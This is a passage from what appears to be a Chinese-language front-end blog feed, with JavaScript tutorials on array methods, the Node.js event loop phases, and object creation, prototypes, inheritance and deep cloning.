<h6 id="splice"><a href="#splice" class="headerlink" title="splice()"></a>splice()</h6><ul>
<li>描述：对数组的项进行 删除、插入、替换 等操作，功能十分强大</li>
<li><p>参数：</p>
  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">第一个参数：要删除的第一项的位置</span><br><span class="line">第二个参数：要删除的项数</span><br><span class="line">第三个参数（第四个、第五个......）：插入的项</span><br></pre></td></tr></table></figure>
</li>
<li><p>返回值：由删除的项组成的数组</p>
</li>
<li>是否改变原数组：是</li>
</ul>
<h6 id="【ES6】copyWithin"><a href="#【ES6】copyWithin" class="headerlink" title="【ES6】copyWithin()"></a>【ES6】copyWithin()</h6><ul>
<li>描述：在数组内部，将指定位置的成员拷贝到其他位置（会覆盖原有成员）</li>
<li><p>参数：</p>
  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">第一个参数：要拷贝的目标位置(target)</span><br><span class="line">第二个参数：从该位置读取数据，默认是0，负值表示倒数</span><br><span class="line">第三个参数：读取到该位置结束，默认是 数组的长度，不包含该位置，负值表示倒数</span><br></pre></td></tr></table></figure>
</li>
<li><p>返回值：修改后的数组</p>
</li>
<li>是否改变原数组：是</li>
</ul>
<h6 id="【ES6】fill"><a href="#【ES6】fill" class="headerlink" title="【ES6】fill()"></a>【ES6】fill()</h6><ul>
<li>描述：使用给定值，填充数组</li>
<li><p>参数：</p>
  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">第一个参数：填充的值</span><br><span class="line">第二个参数：填充的起始位置</span><br><span class="line">第三个参数：填充的结束位置(不包含该位置)</span><br></pre></td></tr></table></figure>
</li>
<li><p>返回值：（待测）</p>
</li>
<li>是否改变原数组：是</li>
</ul>
<h4 id="查找-位置方法"><a href="#查找-位置方法" class="headerlink" title="查找/位置方法"></a>查找/位置方法</h4><h6 id="indexOf"><a href="#indexOf" class="headerlink" title="indexOf()"></a>indexOf()</h6><h6 id="lastIndexOf"><a href="#lastIndexOf" class="headerlink" title="lastIndexOf()"></a>lastIndexOf()</h6><ul>
<li>描述：在数组中查找某一项的位置 indexOf() 从前往后查找， lastIndexOf() 从后往前查找</li>
<li><p>参数：</p>
  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">第一个参数：要查找的项</span><br><span class="line">第二个参数：查找起点位置索引</span><br></pre></td></tr></table></figure>
</li>
<li><p>返回值：返回查找项在数组中的位置，未找到返回-1</p>
<p class="tip">注意：在查找过程中使用全等操作符(===)</p>

</li>
</ul>
<h6 id="【ES6】find"><a href="#【ES6】find" class="headerlink" title="【ES6】find()"></a>【ES6】find()</h6><ul>
<li>描述：用于找到第一个符合条件的数组成员</li>
<li>参数：一个函数，函数的参数：1、项。2、项的索引。3、数组对象本身</li>
<li>返回值：如果有符合添加的项，返回该项的值，如果没有找到符合条件的项，返回 <code>undefined</code></li>
</ul>
<h6 id="【ES6】findIndex"><a href="#【ES6】findIndex" class="headerlink" title="【ES6】findIndex()"></a>【ES6】findIndex()</h6><ul>
<li>描述：与find()方法功能一样，唯一不同的是，返回的是项的位置，未找到返回 -1</li>
</ul>
<h6 id="【ES7】includes"><a href="#【ES7】includes" class="headerlink" title="【ES7】includes()"></a>【ES7】includes()</h6><ul>
<li>描述：查找数组中是否包含给定值</li>
<li><p>参数：</p>
  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">第一个参数：要查找的值</span><br><span class="line">第二个参数：查找的起始位置，默认是0，负数表示倒数，超出范围会重置为0</span><br></pre></td></tr></table></figure>
</li>
<li><p>返回值：<code>true</code> 包含， <code>false</code> 不包含</p>
<p class="tip">includes 相比于 indexOf 的优势有两点：1、更加语义化，不需要判断返回值是否为 -1。2、由于 indexOf 底层在判断是否相等时使用的是全等操作符 ===，这会导致使用 indexOf 查找 NaN 时查不到，而 includes 则不存在这样的问题</p>

</li>
</ul>
<h4 id="迭代方法"><a href="#迭代方法" class="headerlink" title="迭代方法"></a>迭代方法</h4><h6 id="forEach"><a href="#forEach" class="headerlink" title="forEach()"></a>forEach()</h6><h6 id="every"><a href="#every" class="headerlink" title="every()"></a>every()</h6><h6 id="some"><a href="#some" class="headerlink" title="some()"></a>some()</h6><h6 id="filter"><a href="#filter" class="headerlink" title="filter()"></a>filter()</h6><h6 id="map"><a href="#map" class="headerlink" title="map()"></a>map()</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">描述：迭代数组，对数组的每一项执行给定函数</span><br><span class="line">参数：第一个参数：函数</span><br><span class="line">            函数接收三个参数</span><br><span class="line">                1、数组的项</span><br><span class="line">                2、该项在数组中的位置</span><br><span class="line">                3、数组对象本身</span><br><span class="line">        第二个参数：第一个参数的执行环境(this指向)</span><br><span class="line">返回值：</span><br><span class="line">    forEach() 无返回值</span><br><span class="line">    every() 对数组运行给定函数，如果该函数对每一项都返回true，则返回true</span><br><span class="line">    some() 对数组运行给定函数，如果该函数对任意一项返回true，则返回true</span><br><span class="line">    filter() 对数组执行给定函数，返回该函数返回true的项组成的数组</span><br><span class="line">    map() 对数组执行给定函数，返回每次函数调用结果组成的数组</span><br></pre></td></tr></table></figure>
<h6 id="【ES6】entries-，keys-和values"><a href="#【ES6】entries-，keys-和values" class="headerlink" title="【ES6】entries()，keys()和values()"></a>【ES6】entries()，keys()和values()</h6><ul>
<li>描述：<code>entries()</code>，<code>keys()</code> 和 <code>values()</code> 都用于遍历数组。它们都返回一个遍历器对象（详见《Iterator》一章），可以用 <code>for...of</code> 循环进行遍历，唯一的区别是 <code>keys()</code> 是对键名的遍历、<code>values()</code> 是对键值的遍历，<code>entries()</code> 是对键值对的遍历。</li>
</ul>
<h4 id="归并方法"><a href="#归并方法" class="headerlink" title="归并方法"></a>归并方法</h4><h6 id="reduce"><a href="#reduce" class="headerlink" title="reduce()"></a>reduce()</h6><h6 id="reduceRight"><a href="#reduceRight" class="headerlink" title="reduceRight()"></a>reduceRight()</h6><ul>
<li>描述：迭代数组的所有项，构建一个最终的返回值</li>
<li><p>参数：</p>
  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">第一个参数：函数，函数接收的参数：</span><br><span class="line">    1、前一项(pre)</span><br><span class="line">    2、当前项(cur)</span><br><span class="line">    3、当前项的索引(index)</span><br><span class="line">    4、数组对象本身(array)</span><br><span class="line">第二个参数：归并的初始值</span><br></pre></td></tr></table></figure>
</li>
<li><p>返回值：迭代的最终值</p>
</li>
</ul>
<p class="tip"><br>注意：第一次迭代的时候，pre是数组的第一项，cur是数组的第二项，reduce() 和 reduceRight() 除了迭代方向不一致外，其他完全相同<br></p>
]]></content>
      <categories>
        <category>ECMA</category>
      </categories>
      <tags>
        <tag>ECMA</tag>
        <tag>数组</tag>
      </tags>
  </entry>
  <entry>
    <title>ECMA-运行机制之Event_Loop</title>
    <url>/2018/05/30/ECMA_%E8%BF%90%E8%A1%8C%E6%9C%BA%E5%88%B6%E4%B9%8BEvent-Loop/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>距离这篇文章完笔虽然才两个月，但是我已经对各种细节忘记得差不多（不常用的东西马上就忘记了，大脑内存不足会经常自动腾出空间记忆别的事情），各位如果有任何疑问我大概率是回答不上来，非常抱歉。另外我觉得深入折腾这种东西意义其实不是太大，还不如学习一下更加通用价值更加高的知识（例如算法、数据库原理、操作系统原理、tcp/ip协议、架构设计、高数线代概率统计等）</p>
<h2 id="不同的event-loop"><a href="#不同的event-loop" class="headerlink" title="不同的event loop"></a>不同的event loop</h2><p>event loop是一个执行模型，在不同的地方有不同的实现。浏览器和nodejs基于不同的技术实现了各自的event loop。网上关于它的介绍多如牛毛，但大多数是基于浏览器的，真正讲nodejs的event loop的并没有多少，甚至很多将浏览器和nodejs的event loop等同起来的。  我觉得讨论event loop要做到以下两点：</p>
<ul>
<li>首先要确定好上下文，nodejs和浏览器的event loop是两个有明确区分的事物，不能混为一谈。</li>
<li>其次，讨论一些js异步代码的执行顺序时候，要基于node的源码而不是自己的臆想。</li>
</ul>
<p>简单来讲，</p>
<ul>
<li>nodejs的event是基于libuv，而浏览器的event loop则在<a href="https://www.w3.org/TR/html5/webappapis.html#event-loops" target="_blank" rel="noopener">html5的规范</a>中明确定义。</li>
<li>libuv已经对event loop作出了实现，而html5规范中只是定义了浏览器中event loop的模型，具体实现留给了浏览器厂商。</li>
</ul>
<h2 id="nodejs中的event-loop"><a href="#nodejs中的event-loop" class="headerlink" title="nodejs中的event loop"></a>nodejs中的event loop</h2><p>关于nodejs中的event loop有两个地方可以参考，一个是nodejs<a href="https://nodejs.org/en/docs/guides/event-loop-timers-and-nexttick/" target="_blank" rel="noopener">官方的文档</a>；另一个是libuv的<a href="http://docs.libuv.org/en/v1.x/design.html" target="_blank" rel="noopener">官方的文档</a>，前者已经对nodejs有一个比较完整的描述，而后者则有更多细节的描述。nodejs正在快速发展，源码变化很大，以下的讨论都是基于nodejs9.5.0。</p>
<p>（然而nodejs的event loop似乎比预料更加复杂，在查看nodejs源码的过程中我惊奇发现原来nodejs的event loop的某些阶段，还会将v8的micro task queue中的任务取出来运行，看来nodejs的浏览器的event loop还是存在一些关联，这些细节我们往后再讨论，目前先关注重点内容。）</p>
<h3 id="event-loop的6个阶段（phase）"><a href="#event-loop的6个阶段（phase）" class="headerlink" title="event loop的6个阶段（phase）"></a>event loop的6个阶段（phase）</h3><p>nodejs的event loop分为6个阶段，每个阶段的作用如下（process.nextTick()在6个阶段结束的时候都会执行，文章后半部分会详细分析process.nextTick()的回调是怎么引进event loop，仅仅从uv_run()是找不到process.nextTick()是如何牵涉进来）：</p>
<ul>
<li>timers：执行setTimeout() 和 setInterval()中到期的callback。</li>
<li>I/O callbacks：上一轮循环中有少数的I/Ocallback会被延迟到这一轮的这一阶段执行</li>
<li>idle, prepare：仅内部使用</li>
<li>poll：最为重要的阶段，执行I/O callback，在适当的条件下会阻塞在这个阶段</li>
<li>check：执行setImmediate的callback</li>
<li>close callbacks：执行close事件的callback，例如socket.on(“close”,func)</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">   ┌───────────────────────┐</span><br><span class="line">┌─&gt;│        timers         │</span><br><span class="line">│  └──────────┬────────────┘</span><br><span class="line">│  ┌──────────┴────────────┐</span><br><span class="line">│  │     I/O callbacks     │</span><br><span class="line">│  └──────────┬────────────┘</span><br><span class="line">│  ┌──────────┴────────────┐</span><br><span class="line">│  │     idle, prepare     │</span><br><span class="line">│  └──────────┬────────────┘      ┌───────────────┐</span><br><span class="line">│  ┌──────────┴────────────┐      │   incoming:   │</span><br><span class="line">│  │         poll          │&lt;─────┤  connections, │</span><br><span class="line">│  └──────────┬────────────┘      │   data, etc.  │</span><br><span class="line">│  ┌──────────┴────────────┐      └───────────────┘</span><br><span class="line">│  │        check          │</span><br><span class="line">│  └──────────┬────────────┘</span><br><span class="line">│  ┌──────────┴────────────┐</span><br><span class="line">└──┤    close callbacks    │</span><br><span class="line">   └───────────────────────┘</span><br></pre></td></tr></table></figure>
<p>event loop的每一次循环都需要依次经过上述的阶段。  每个阶段都有自己的callback队列，每当进入某个阶段，都会从所属的队列中取出callback来执行，当队列为空或者被执行callback的数量达到系统的最大数量时，进入下一阶段。这六个阶段都执行完毕称为一轮循环</p>
]]></content>
      <categories>
        <category>ECMA</category>
      </categories>
      <tags>
        <tag>ECMA</tag>
        <tag>Event-Loop</tag>
      </tags>
  </entry>
  <entry>
    <title>ECMA_对象</title>
    <url>/2018/04/17/ECMA_%E5%AF%B9%E8%B1%A1/</url>
    <content><![CDATA[<h1 id="js对象详解-JavaScript对象深度剖析，深度理解js对象"><a href="#js对象详解-JavaScript对象深度剖析，深度理解js对象" class="headerlink" title="js对象详解(JavaScript对象深度剖析，深度理解js对象)"></a>js对象详解(JavaScript对象深度剖析，深度理解js对象)</h1><ul>
<li>创建对象</li>
<li><strong>proto</strong>与prototype</li>
<li>继承与原型链</li>
<li>对象的深度克隆</li>
<li>一些Object的方法与需要注意的点</li>
<li>ES6新增特性</li>
</ul>
<h2 id="创建对象"><a href="#创建对象" class="headerlink" title="创建对象"></a>创建对象</h2><ul>
<li>字面量的方式：<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> myHonda = &#123;<span class="attr">color</span>: <span class="string">"red"</span>, <span class="attr">wheels</span>: <span class="number">4</span>, <span class="attr">engine</span>: &#123;<span class="attr">cylinders</span>: <span class="number">4</span>, <span class="attr">size</span>: <span class="number">2.2</span>&#125;&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>就是<code>new Object()的语法糖，一样一样的。</code></p>
<ul>
<li>工厂模式：<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">createCar</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> oTemp = <span class="keyword">new</span> <span class="built_in">Object</span>();</span><br><span class="line">    oTemp.name = <span class="built_in">arguments</span>[<span class="number">0</span>];</span><br><span class="line">    <span class="comment">//直接给对象添加属性，每个对象都有直接的属性</span></span><br><span class="line">    oTemp.age = <span class="built_in">arguments</span>[<span class="number">1</span>];</span><br><span class="line">    oTemp.showName = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        alert(<span class="keyword">this</span>.name);</span><br><span class="line">    &#125;;<span class="comment">//每个对象都有一个 showName 方法版本</span></span><br><span class="line">    <span class="keyword">return</span> oTemp;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> myHonda = createCar(<span class="string">'honda'</span>, <span class="number">5</span>);</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>只是给<code>new Object()</code>包了层皮，方便量产，并没有本质区别，姑且算创建对象的一种方式。</p>
<ul>
<li>构造函数：<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params">name, age, sex</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.name = name;</span><br><span class="line">    <span class="keyword">this</span>.age = age;</span><br><span class="line">    <span class="keyword">this</span>.sex = sex;</span><br><span class="line">    <span class="keyword">this</span>.getName = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.name;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> rand = <span class="keyword">new</span> Person(<span class="string">'Rand McKinnon'</span>, <span class="number">33</span>, <span class="string">'M'</span>);</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>上面构造函数的<code>getName</code>方法，每次实例化都会新建该函数对象，还形成了当前情况下并没有卵用的闭包，所以构造函数添加方法用下面的方式处理，工程模式给对象添加方法的时候也应该用下面的方式避免重复构造函数对象。<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params">name, age, sex</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.name = name;</span><br><span class="line">    <span class="keyword">this</span>.age = age;</span><br><span class="line">    <span class="keyword">this</span>.sex = sex;</span><br><span class="line">    <span class="keyword">this</span>.getName = getName;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getName</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.name;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>构造函数创建对象的过程和工厂模式又是半斤八两，相当于隐藏了创建新对象和返回该对象这两步，构造函数内this指向新建对象，没什么不同<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// new的过程</span></span><br><span class="line"><span class="keyword">let</span> obj = &#123;&#125;;</span><br><span class="line">obj.__proto__ = Person.prototype;</span><br><span class="line">Person.call(obj);</span><br></pre></td></tr></table></figure></p>
<p><code>最大的不同</code>：构造函数创造出来的对象constructor属性指向该构造函数，工程模式指向<code>function Object() {...}</code>。<br>构造函数相当于给原型链上加了一环，构造函数有自己的 <code>prototype</code>，工厂模式就是个普通函数。说到这儿我上一句话出现了漏洞，工厂模式的 <code>constructor</code> 指向哪得看第一句话 new 的是什么。<br>构造函数直接调用而不 <code>new</code> 的话，就看调用时候 <code>this</code> 指向谁了，直接调用就把属性绑到 <code>window</code> 上了，通过 <code>call</code> 或者 <code>apply</code> 绑定到其他对象作用域就把属性添加到该对象了。</p>
<ul>
<li>原型模式<br>构造函数虽然在原型链上加了一环，但显然这一环啥都没有啊，这样一来和工厂模式又有什么区别？加了一环又有什么意义？原型模式浮出水面<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Car</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//用空构造函数设置类名</span></span><br><span class="line">Car.prototype.color = <span class="string">'blue'</span>;<span class="comment">// 每个对象都共享相同属性</span></span><br><span class="line">Car.prototype.doors = <span class="number">3</span>;</span><br><span class="line">Car.prototype.drivers = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="string">'Mike'</span>, <span class="string">'John'</span>);</span><br><span class="line">Car.prototype.showColor = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    alert(<span class="keyword">this</span>.color);</span><br><span class="line">&#125;;<span class="comment">// 每个对象共享一个方法版本，省内存。</span></span><br><span class="line"><span class="comment">// 构造函数的原型属性可以通过字面量来设置，别忘了通过 Object.defineProperty()设置 constructor 为该构造函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Car</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Car.prototype = &#123;</span><br><span class="line">    color: <span class="string">'blue'</span>,</span><br><span class="line">    doors: <span class="number">3</span>,</span><br><span class="line">    showColor: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        alert(<span class="keyword">this</span>.color);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="built_in">Object</span>.defineProperty(Car.prototype, <span class="string">'constructor'</span>, &#123;<span class="attr">enumerable</span>: <span class="literal">false</span>, <span class="attr">value</span>: Car&#125;);</span><br><span class="line"><span class="comment">// (不设置 constructor 会导致 constructor 不指向构造函数，直接设置 constructor 会导致 constructor 可枚举)</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>使用原型模式注意动态性，通过构造函数实例化出的对象，他的原型对象是构造函数的 <code>prototype</code> ，如果在他的原型对象上增加或删除一些方法，该对象会继承这些修改。例如，先通过构造函数 <code>A</code> 实例化出对象 <code>a</code> ，然后再给 <code>A.prototype</code> 添加一个方法，<code>a</code> 是可以继承这个方法的。但是给 <code>A.prototype</code> 设置一个新的对象，<code>a</code> 是不会继承这个新对象的属性和方法的。听起来有点绕，修改 <code>A.prototype</code> 相当于直接修改 <code>a</code> 的原型对象，<code>a</code> 很自然的会继承这些修改，但是重新给 <code>A.prototype</code> 赋值的话，修改的是构造函数的原型，并没有影响 <code>a</code> 的原型对象！<code>a</code> 被创建出来以后原型对象就已经确定了，除非直接修改这个原型对象(或者这个原型对象的原型对象)，否则 <code>a</code> 是不会继承这些修改的！</p>
<ul>
<li>Object.create()<br>传入要创建对象实例的原型对象，和原型模式几乎是一个意思也是相当于在原型链上加了一环，区别在于这种方式创建的对象没有构造函数。这种方式相当于：<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">object</span>(<span class="params">o</span>) </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">F</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    F.prototype = o;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> F();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>相当于构造函数只短暂的存在了一会，创建出来的对象的<code>constructor</code>指向原型对象<code>o</code>的<code>constructor</code></p>
<ul>
<li><p>混合模式<br>使用原型模式时，当给实例对象设置自己专属的属性的时候，该实例对象会忽略原型链中的该属性。但当原型链中的属性是引用类型值的时候，操作不当有可能会直接修改原型对象的属性！这会影响到所有使用该原型对象的实例对象！<br>大部分情况下，实例对象的多数方法是共有的，多数属性是私有的，所以属性在构造函数中设置，方法在原型中设置是合适的，构造函数与原型结合使用是通常的做法。<br>还有一些方法，无非是工厂模式与构造函数与原型模式的互相结合，在生成过程和 <code>this</code> 指向上做一些小变化。</p>
</li>
<li><p>class方式：es6<br>见下面 ES6 class 部分，只是一个语法糖，本质上和构造函数并没有什么区别，但是继承的方式有一些区别。</p>
</li>
</ul>
<h2 id="proto-和prototype"><a href="#proto-和prototype" class="headerlink" title="__proto__和prototype"></a>__proto__和prototype</h2><p>这两个到底什么关系？ 首先要明白js存在两种对象。</p>
<blockquote>
<p>1、实例对象<br>2、函数对象</p>
</blockquote>
<p>所有<code>实例对象</code>都有一个<code>__proto__</code>属性，所有<code>函数对象</code>都有<code>prototype</code>属性。所有的<code>实例对象</code>都是通过构造函数创建出来的。<code>__proto__</code>指向创建该<code>实例对象</code>的构造函数的<code>prototype</code>属性。<code>prototype</code>属性也是一个<code>实例对象</code>，也存在<code>__proto__</code>属性，它指向更高一级的构造函数<code>prototype</code>，最终<code>Object.prototype.__proto__</code>指向<code>null</code>，原型链结束。<br><code>实例对象</code>的<code>__proto__</code>是浏览器的实现，并没有在ECMA标准中，可以用<code>constructor.prototype</code>代替。</p>
<p>这里感觉很乱，用一张图看吧</p>
<p><img src="/static/img/jsObject.jpg" width="500"></p>
<h2 id="继承和原型链"><a href="#继承和原型链" class="headerlink" title="继承和原型链"></a>继承和原型链</h2><p>当访问一个对象的属性时，如果在对象本身找不到，就会去搜索对象的原型，原型的原型，知道原型链的尽头null，那原型链的怎么连起来的呢？<br>把<code>实例对象</code> <code>函数对象</code> <code>原型对象</code>视为一个小组，上面说了三者之间的关系，<code>构造函数</code>是函数，可<code>实例对象</code>和<code>原型对象</code>都是<code>普通对象</code>啊，这样就出现了这样的情况：<br>这个小组的<code>原型对象</code>，等于另一个小组<code>实例对象</code>，而此小组的<code>原型对象</code>有可能是其他小组的<code>实例对象</code>，这样一个个的小组不就连接起来了吗。举个例子<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Super</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.val = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">this</span>.arr = [<span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Sub</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Sub.prototype = <span class="keyword">new</span> Super();</span><br></pre></td></tr></table></figure></p>
<p><code>Sub</code>是一个小组，<code>Super</code>是一个小组，<code>Sub</code>的原型对象链接到了<code>Super</code>的<code>实例对象</code>。<br>基本上所有对象顺着原型链爬到头都是<code>Object.prototype</code>，而<code>Object.prototype</code>就没有<code>原型对象</code>，原型链就走到头了。</p>
<h3 id="判断构造函数的原型对象是否存在于实例对象的原型链中："><a href="#判断构造函数的原型对象是否存在于实例对象的原型链中：" class="headerlink" title="判断构造函数的原型对象是否存在于实例对象的原型链中："></a>判断构造函数的原型对象是否存在于实例对象的原型链中：</h3><p><code>实例对象 instanceof 构造函数</code>，返回一个布尔值。<code>原型对象.isPrototypeOf(实例对象)</code>，返回一个布尔值。</p>
<p>上面是最简单的继承方式了，但是有两个致命缺点：</p>
<blockquote>
<p>所有<code>Sub</code>的实例对象都继承自统一<code>Super</code>的实例对象，我们想穿参数到<code>Super</code>怎么办？<br>如果<code>Super</code>里有引用类型的值，比如上面例子中<code>Sub</code>的实例对象中的arr属性<code>push</code>一个值，岂不是牵一发动全身？</p>
</blockquote>
<p>下面说一种最常用的组合继承模式，先举个例子<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Super</span>(<span class="params">value</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 只在此处声明基本属性和引用属性</span></span><br><span class="line">    <span class="keyword">this</span>.val = value;</span><br><span class="line">    <span class="keyword">this</span>.arr = [<span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//  在此处声明函数</span></span><br><span class="line">Super.prototype.fun1 = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">&#125;;</span><br><span class="line">Super.prototype.fun2 = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Super.prototype.fun3...</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Sub</span>(<span class="params">value</span>) </span>&#123;</span><br><span class="line">    Super.call(<span class="keyword">this</span>, value);   <span class="comment">// 核心</span></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Sub.prototype = <span class="keyword">new</span> Super();    <span class="comment">// 核心</span></span><br></pre></td></tr></table></figure></p>
<p>过程是这样的，在简单的原型链继承的基础上， <code>Sub</code> 的构造函数里运行 <code>Super</code> ，从而给 <code>Sub</code> 的每一个实例对象一份单独的属性，解决了上面两个问题，可以给 <code>Super</code> 传参数了，而且因为是独立的属性，不会因为误操作引用类型值而影响其他实例了。不过还有个小缺点: <code>Sub</code> 中调用的 <code>Super</code> 给每个 <code>Sub</code> 的实例对象一套新的属性，覆盖了继承的 <code>Super</code> 实例对象的属性，那被覆盖的的那套属性不就浪费了？岂不是白继承了？最严重的问题是 <code>Super</code> 被执行了两次，这不能忍(其实也没多大问题)。下面进行一下优化，把上面例子最后一行替换为:</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">Sub.prototype = <span class="built_in">Object</span>.create(Super.prototype);</span><br><span class="line"><span class="comment">// Object.create() 给原型链上添加一环，否则 Sub 和 Super 的原型就重叠了。</span></span><br><span class="line">Sub.prototype.constructor = Sub;</span><br></pre></td></tr></table></figure>
<p>到此为止，继承非常完美。<br>其他还有各路继承方式无非是在 简单原型链继承 –&gt; 优化的组合继承 路程之间的一些思路或者封装。</p>
<ul>
<li>通过 class 继承的方式:<br>通过 <code>class</code> 实现继承的过程与 <code>ES5</code>完全相反，详细见下面 <code>ES6 class</code>的继承 部分。</li>
</ul>
<h2 id="对象的深度克隆"><a href="#对象的深度克隆" class="headerlink" title="对象的深度克隆"></a>对象的深度克隆</h2><p><code>JavaScript</code>的基础类型是值传递，而对象是引用传递，这导致一个问题:<br>克隆一个基础类型的变量的时候，克隆出来的的变量是和旧的变量完全独立的，只是值相同而已。<br>而克隆对象的时候就要分两种情况了，简单的赋值会让两个变量指向同一块内存，两者代表同一个对象，甚至算不上克隆克隆。但我们常常需要的是两个属性和方法完全相同但却完全独立的对象，称为深度克隆。我们接下来讨论几种深度克隆的方法。<br>说几句题外的话，业界有一个非常知名的库 <code>immutable</code> ，个人认为很大程度上解决了深度克隆的痛点，我们修改一个对象的时候，很多时候希望得到一个全新的对象(比如Redux每次都要用一个全新的对象修改状态)，由此我们就需要进行深度克隆。而 <code>immutable</code> 相当于产生了一种新的对象类型，每一次修改属性都会返回一个全新的 <code>immutable</code> 对象，免去了我们深度克隆的工作是小事，关键性能特别好。</p>
<ul>
<li><p>历遍属性</p>
  <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">clone</span>(<span class="params">obj</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> newobj = obj.constructor === <span class="built_in">Array</span> ? [] : &#123;&#125;;  <span class="comment">// 用 instanceof 判断也可</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> obj !== <span class="string">'object'</span> || obj === <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> i <span class="keyword">in</span> obj) &#123;</span><br><span class="line">            newobj[i] = <span class="keyword">typeof</span> obj[i] === <span class="string">'object'</span> ? clone(obj[i]) : obj[i];</span><br><span class="line">            <span class="comment">// 只考虑 对象和数组， 函数虽然也是引用类型，但直接赋值并不会产生什么副作用，所以函数类型无需深度克隆。</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> newobj;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>原型式克隆</p>
  <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">clone</span>(<span class="params">obj</span>) </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">F</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    F.prototype = obj;</span><br><span class="line">    <span class="keyword">let</span> f = <span class="keyword">new</span> F();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> obj) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">typeof</span> obj[key] === <span class="string">'object'</span>) &#123;</span><br><span class="line">            f[key] = clone(obj[key]);</span><br><span class="line">        